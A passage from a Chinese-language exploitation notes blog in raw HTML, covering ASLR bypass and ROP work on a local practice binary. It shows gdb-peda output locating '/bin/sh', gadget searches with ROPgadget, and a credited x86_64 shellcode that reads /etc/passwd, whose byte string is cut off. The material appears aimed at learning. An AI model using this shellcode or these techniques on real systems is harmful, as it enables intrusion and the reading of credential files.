class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln</span><br><span class=\"line\">Catchpoint 1 (exec)</span><br><span class=\"line\">Reading symbols from vuln...done.</span><br><span class=\"line\">gdb-peda$ b *main</span><br><span class=\"line\">Breakpoint 2 at 0x739: file vuln.c, line 17.</span><br><span class=\"line\">gdb-peda$ r</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln </span><br><span class=\"line\"></span><br><span class=\"line\">[----------------------------------registers-----------------------------------]</span><br><span class=\"line\">RAX: 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">RBX: 0x0 </span><br><span class=\"line\">RCX: 0x555555554790 (&lt;__libc_csu_init&gt;:\tpush   r15)</span><br><span class=\"line\">RDX: 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class=\"line\">RSI: 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class=\"line\">RDI: 0x1 </span><br><span class=\"line\">RBP: 0x555555554790 (&lt;__libc_csu_init&gt;:\tpush   r15)</span><br><span class=\"line\">RSP: 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">RIP: 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class=\"line\">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class=\"line\">R10: 0x0 </span><br><span class=\"line\">R11: 0x1 </span><br><span class=\"line\">R12: 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">R13: 0x7fffffffddd0 --&gt; 0x1 </span><br><span class=\"line\">R14: 0x0 </span><br><span class=\"line\">R15: 0x0</span><br><span class=\"line\">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class=\"line\">[-------------------------------------code-------------------------------------]</span><br><span class=\"line\">   0x55555555472a &lt;shell+16&gt;:\tcall   0x5555555545d0 &lt;system@plt&gt;</span><br><span class=\"line\">   0x55555555472f &lt;shell+21&gt;:\tmov    edi,0x0</span><br><span class=\"line\">   0x555555554734 &lt;shell+26&gt;:\tcall   0x5555555545f0 &lt;exit@plt&gt;</span><br><span class=\"line\">=&gt; 0x555555554739 &lt;main&gt;:\tpush   rbp</span><br><span class=\"line\">   0x55555555473a &lt;main+1&gt;:\tmov    rbp,rsp</span><br><span class=\"line\">   0x55555555473d &lt;main+4&gt;:\tsub    rsp,0x120</span><br><span class=\"line\">   0x555555554744 &lt;main+11&gt;:\tmov    DWORD PTR [rbp-0x114],edi</span><br><span class=\"line\">   0x55555555474a &lt;main+17&gt;:\tmov    QWORD PTR [rbp-0x120],rsi</span><br><span class=\"line\">[------------------------------------stack-------------------------------------]</span><br><span class=\"line\">0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">0008| 0x7fffffffdd00 --&gt; 0x1 </span><br><span class=\"line\">0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class=\"line\">0024| 0x7fffffffdd10 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffdd20 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d </span><br><span class=\"line\">0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">[------------------------------------------------------------------------------]</span><br><span class=\"line\">Legend: code, data, rodata, value</span><br><span class=\"line\"></span><br><span class=\"line\">Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17</span><br><span class=\"line\">warning: Source file is more recent than executable.</span><br><span class=\"line\">17\tint main(int argc, char* argv[]) &#123;</span><br><span class=\"line\">gdb-peda$ telescope 200</span><br><span class=\"line\">0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">0008| 0x7fffffffdd00 --&gt; 0x1 </span><br><span class=\"line\">0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class=\"line\">0024| 0x7fffffffdd10 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffdd20 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d </span><br><span class=\"line\">0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">0064| 0x7fffffffdd38 --&gt; 0x7fffffffddd0 --&gt; 0x1 </span><br><span class=\"line\">0072| 0x7fffffffdd40 --&gt; 0x0 </span><br><span class=\"line\">0080| 0x7fffffffdd48 --&gt; 0x0 </span><br><span class=\"line\">0088| 0x7fffffffdd50 --&gt; 0x3e3e2b88b8ee246d </span><br><span class=\"line\">0096| 0x7fffffffdd58 --&gt; 0x3e3e3b37b470246d </span><br><span class=\"line\">0104| 0x7fffffffdd60 --&gt; 0x7fff00000000 </span><br><span class=\"line\">0112| 0x7fffffffdd68 --&gt; 0x0 </span><br><span class=\"line\">0120| 0x7fffffffdd70 --&gt; 0x0 </span><br><span class=\"line\">0128| 0x7fffffffdd78 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:\tadd    r14,0x8)</span><br><span class=\"line\">0136| 0x7fffffffdd80 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 </span><br><span class=\"line\">0144| 0x7fffffffdd88 --&gt; 0x22bf66c6 </span><br><span class=\"line\">0152| 0x7fffffffdd90 --&gt; 0x0 </span><br><span class=\"line\">0160| 0x7fffffffdd98 --&gt; 0x0 </span><br><span class=\"line\">0168| 0x7fffffffdda0 --&gt; 0x0 </span><br><span class=\"line\">0176| 0x7fffffffdda8 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">0184| 0x7fffffffddb0 --&gt; 0x7fffffffddd0 --&gt; 0x1 </span><br><span class=\"line\">0192| 0x7fffffffddb8 --&gt; 0x55555555463a (&lt;_start+42&gt;:\thlt)</span><br><span class=\"line\">--More--(25/200)</span><br><span class=\"line\">0200| 0x7fffffffddc0 --&gt; 0x7fffffffddc8 --&gt; 0x1c </span><br><span class=\"line\">0208| 0x7fffffffddc8 --&gt; 0x1c </span><br><span class=\"line\">0216| 0x7fffffffddd0 --&gt; 0x1 </span><br><span class=\"line\">0224| 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class=\"line\">0232| 0x7fffffffdde0 --&gt; 0x0 </span><br><span class=\"line\">0240| 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class=\"line\">0248| 0x7fffffffddf0 --&gt; 0x7fffffffe1d1 (&quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc&quot;...)</span><br><span class=\"line\">0256| 0x7fffffffddf8 --&gt; 0x7fffffffe7bd (&quot;LC_MEASUREMENT=zh_CN.UTF-8&quot;)</span><br><span class=\"line\">0264| 0x7fffffffde00 --&gt; 0x7fffffffe7d8 (&quot;LESSCLOSE=/usr/bin/lesspipe %s %s&quot;)</span><br><span class=\"line\">0272| 0x7fffffffde08 --&gt; 0x7fffffffe7fa (&quot;LC_PAPER=zh_CN.UTF-8&quot;)</span><br><span class=\"line\">0280| 0x7fffffffde10 --&gt; 0x7fffffffe80f (&quot;LC_MONETARY=zh_CN.UTF-8&quot;)</span><br><span class=\"line\">0288| 0x7fffffffde18 --&gt; 0x7fffffffe827 (&quot;XDG_MENU_PREFIX=gnome-&quot;)</span><br><span class=\"line\">0296| 0x7fffffffde20 --&gt; 0x7fffffffe83e (&quot;_=/usr/bin/gdb&quot;)</span><br><span class=\"line\">0304| 0x7fffffffde28 --&gt; 0x7fffffffe84d (&quot;LANG=en_US.UTF-8&quot;)</span><br><span class=\"line\">0312| 0x7fffffffde30 --&gt; 0x7fffffffe85e (&quot;DISPLAY=:0&quot;)</span><br><span class=\"line\">0320| 0x7fffffffde38 --&gt; 0x7fffffffe869 (&quot;ABC=/bin/sh&quot;)</span><br><span class=\"line\">0328| 0x7fffffffde40 --&gt; 0x7fffffffe875 (&quot;OLDPWD=/home/tianji/Desktop/sploit&quot;)</span><br><span class=\"line\">0336| 0x7fffffffde48 --&gt; 0x7fffffffe898 (&quot;GNOME_SHELL_SESSION_MODE=ubuntu&quot;)</span><br><span class=\"line\">0344| 0x7fffffffde50 --&gt; 0x7fffffffe8b8 (&quot;COLORTERM=truecolor&quot;)</span><br><span class=\"line\">0352| 0x7fffffffde58 --&gt; 0x7fffffffe8cc (&quot;USERNAME=tianji&quot;)</span><br><span class=\"line\">0360| 0x7fffffffde60 --&gt; 0x7fffffffe8dc (&quot;XDG_VTNR=1&quot;)</span><br><span class=\"line\">0368| 0x7fffffffde68 --&gt; 0x7fffffffe8e7 (&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;)</span><br><span class=\"line\">0376| 0x7fffffffde70 --&gt; 0x7fffffffe910 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class=\"line\">0384| 0x7fffffffde78 --&gt; 0x7fffffffe946 (&quot;LC_NAME=zh_CN.UTF-8&quot;)</span><br><span class=\"line\">0392| 0x7fffffffde80 --&gt; 0x7fffffffe95a (&quot;XDG_SESSION_ID=1&quot;)</span><br></pre></td></tr></table></figure>\n<p>可以看到”/bin/sh”的地址：<code>0x7fffffffe869 + 0x6 = 0x7fffffffe86e</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ x/s 0x7fffffffe86e</span><br><span class=\"line\">0x7fffffffe86e:\t&quot;bin/sh&quot;</span><br></pre></td></tr></table></figure>\n<p>当然，这个方法仅限本地使用。</p>\n<h2 id=\"反汇编代码\"><a href=\"#反汇编代码\" class=\"headerlink\" title=\"反汇编代码\"></a>反汇编代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;jmp rsp&quot;</span><br><span class=\"line\">ffe4</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;pop rdi; ret&quot;</span><br><span class=\"line\">5fc3</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm &quot;5fc3&quot;</span><br><span class=\"line\">   0:    5f                       pop    edi</span><br><span class=\"line\">   1:    c3                       ret</span><br></pre></td></tr></table></figure>\n<h2 id=\"在可执行文件中找gadget\"><a href=\"#在可执行文件中找gadget\" class=\"headerlink\" title=\"在可执行文件中找gadget\"></a>在可执行文件中找gadget</h2><p>方法一:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln</span><br><span class=\"line\">0x7f3</span><br><span class=\"line\">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class=\"line\">0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............</span><br><span class=\"line\">0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........</span><br><span class=\"line\">0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..</span><br><span class=\"line\">0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................</span><br><span class=\"line\">0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\\....</span><br></pre></td></tr></table></figure>\n<p>可以看到5fc3的偏移位置就是: ‘0x7f3’</p>\n<p>方法二:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x0000000000000707 : add bl, dh ; ret</span><br><span class=\"line\">0x00000000000007ff : add bl, dh ; ret</span><br><span class=\"line\">0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class=\"line\">0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class=\"line\">0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class=\"line\">0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class=\"line\">0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class=\"line\">0x0000000000000788 : add byte ptr [rax], al ; leave ; ret</span><br><span class=\"line\">0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000000706 : add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x00000000000007fe : add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000000789 : add cl, cl ; ret</span><br><span class=\"line\">0x00000000000005a3 : add esp, 8 ; ret</span><br><span class=\"line\">0x0000000000000809 : add esp, 8 ; ret</span><br><span class=\"line\">0x00000000000005a2 : add rsp, 8 ; ret</span><br><span class=\"line\">0x0000000000000808 : add rsp, 8 ; ret</span><br><span class=\"line\">0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax</span><br><span class=\"line\">0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000007d9 : call qword ptr [r12 + rbx*8]</span><br><span class=\"line\">0x00000000000007da : call qword ptr [rsp + rbx*8]</span><br><span class=\"line\">0x00000000000005a0 : call rax</span><br><span class=\"line\">0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class=\"line\">0x000000000000059e : je 0x5a4 ; call rax</span><br><span class=\"line\">0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x0000000000000664 : jmp rax</span><br><span class=\"line\">0x00000000000006b5 : jmp rax</span><br><span class=\"line\">0x000000000000078a : leave ; ret</span><br><span class=\"line\">0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000000785 : mov eax, 0 ; leave ; ret</span><br><span class=\"line\">0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]</span><br><span class=\"line\">0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]</span><br><span class=\"line\">0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000007f8 : nop dword ptr [rax + rax] ; ret</span><br><span class=\"line\">0x0000000000000701 : nop dword ptr [rax] ; ret</span><br><span class=\"line\">0x00000000000006b3 : or al, 0x5d ; jmp rax</span><br><span class=\"line\">0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]</span><br><span class=\"line\">0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007f0 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007f2 : pop r15 ; ret</span><br><span class=\"line\">0x0000000000000663 : pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006b4 : pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000000670 : pop rbp ; ret</span><br><span class=\"line\">0x00000000000006c0 : pop rbp ; ret</span><br><span class=\"line\">0x00000000000006ff : pop rbp ; ret</span><br><span class=\"line\">0x00000000000007f3 : pop rdi ; ret</span><br><span class=\"line\">0x00000000000007f1 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000000005a6 : ret</span><br><span class=\"line\">0x0000000000000671 : ret</span><br><span class=\"line\">0x00000000000006c1 : ret</span><br><span class=\"line\">0x0000000000000700 : ret</span><br><span class=\"line\">0x0000000000000709 : ret</span><br><span class=\"line\">0x0000000000000708 : ret</span><br><span class=\"line\">0x000000000000078b : ret</span><br><span class=\"line\">0x00000000000007df : ret</span><br><span class=\"line\">0x00000000000007f4 : ret</span><br><span class=\"line\">0x0000000000000801 : ret</span><br><span class=\"line\">0x0000000000000800 : ret</span><br><span class=\"line\">0x000000000000080c : ret</span><br><span class=\"line\">0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret</span><br><span class=\"line\">0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class=\"line\">0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class=\"line\">0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class=\"line\">0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class=\"line\">0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax</span><br><span class=\"line\">0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax</span><br><span class=\"line\">0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 85</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep &quot;pop rdi ; ret&quot;</span><br><span class=\"line\">0x00000000000007f3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>\n<h2 id=\"shellcode编写\"><a href=\"#shellcode编写\" class=\"headerlink\" title=\"shellcode编写\"></a>shellcode编写</h2><p>读取/etc/passwd</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BITS 64 </span><br><span class=\"line\">; Author Mr.Un1k0d3r - RingZer0 Team </span><br><span class=\"line\">; Read /etc/passwd Linux x86_64 Shellcode </span><br><span class=\"line\">; Shellcode size 82 bytes </span><br><span class=\"line\">global _start </span><br><span class=\"line\">section .text </span><br><span class=\"line\">_start: </span><br><span class=\"line\">    jmp _push_filename </span><br><span class=\"line\"></span><br><span class=\"line\">_readfile: </span><br><span class=\"line\">    ; syscall open file </span><br><span class=\"line\">    pop rdi   ; pop path value </span><br><span class=\"line\">    ; NULL byte fix </span><br><span class=\"line\">    xor byte [rdi + 11], 0x41 </span><br><span class=\"line\"></span><br><span class=\"line\">    xor rax, rax </span><br><span class=\"line\">    add al, 2 </span><br><span class=\"line\">    xor rsi, rsi  ; set O_RDONLY flag </span><br><span class=\"line\">    syscall </span><br><span class=\"line\"></span><br><span class=\"line\">    ; syscall read file </span><br><span class=\"line\">    sub sp, 0xfff </span><br><span class=\"line\">    lea rsi, [rsp] </span><br><span class=\"line\">    mov rdi, rax </span><br><span class=\"line\">    xor rdx, rdx </span><br><span class=\"line\">    mov dx, 0xfff   ; size to read </span><br><span class=\"line\">    xor rax, rax </span><br><span class=\"line\">    syscall </span><br><span class=\"line\"></span><br><span class=\"line\">    ; syscall write to stdout </span><br><span class=\"line\">    xor rdi, rdi </span><br><span class=\"line\">    add dil, 1 ; set stdout fd = 1 </span><br><span class=\"line\">    mov rdx, rax </span><br><span class=\"line\">    xor rax, rax </span><br><span class=\"line\">    add al, 1 </span><br><span class=\"line\">    syscall </span><br><span class=\"line\"></span><br><span class=\"line\">    ; syscall exit </span><br><span class=\"line\">    xor rax, rax </span><br><span class=\"line\">    add al, 60 </span><br><span class=\"line\">    syscall </span><br><span class=\"line\"></span><br><span class=\"line\">_push_filename: </span><br><span class=\"line\">    call _readfile </span><br><span class=\"line\">    path: db &quot;/etc/passwdA&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nasm -f elf64 readfile.asm -o readfile.o </span><br><span class=\"line\">$ for i in $(objdump  -d readfile.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &apos;\\x&apos;$i; done; echo </span><br><span class=\"line\">\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x6 </span><br><span 